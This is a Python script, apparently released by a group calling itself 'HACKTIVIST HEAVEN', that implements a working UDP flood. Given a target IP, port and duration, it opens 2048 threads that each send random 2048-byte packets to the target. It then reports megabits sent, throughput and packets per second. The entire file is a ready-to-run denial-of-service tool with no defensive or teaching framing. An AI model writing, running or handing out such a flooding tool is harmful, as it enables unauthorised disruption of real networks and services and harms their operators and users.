# Made By HACKTIVIST HEAVEN 

import socket
import random
import sys
import threading
import time

stop_event = threading.Event()
lock = threading.Lock()
count = 0
bit = 0
buffer_size = 2048  # Default buffer size
connections = 2048  # Default number of connections

def udp_flood(ip, port, seconds):
    global count, bit, buffer_size, connections

    try:
        ip = socket.gethostbyname(ip)
    except socket.gaierror:
        print("Error resolving IP address.")
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def sender():
        while not stop_event.is_set():
            buffer = bytearray(random.getrandbits(8) for _ in range(buffer_size))
            try:
                sock.sendto(buffer, (ip, port))
                with lock:
                    global count, bit
                    count += 1
                    bit += len(buffer) * 8
            except socket.error as e:
                print(f"Error sending: {e}")
                break

    threads = []
    for _ in range(connections):
        thread = threading.Thread(target=sender)
        thread.start()
        threads.append(thread)

    time.sleep(seconds)
    stop_event.set()

    for thread in threads:
        thread.join()

    sock.close()

    with lock:
        print(f"Total Sent: {bit / 1024 / 1024:.2f} Mb")
        print(f"Mbps: {float(bit) / 1024 / 1024 / seconds:.2f} Mb/s")
        print(f"PPS: {float(count) / seconds:.2f} packets/s")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} ip port seconds")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    seconds = int(sys.argv[3])

    print(f"Target IP: {ip}, Port: {port}, Duration: {seconds} seconds")

    udp_flood(ip, port, seconds)
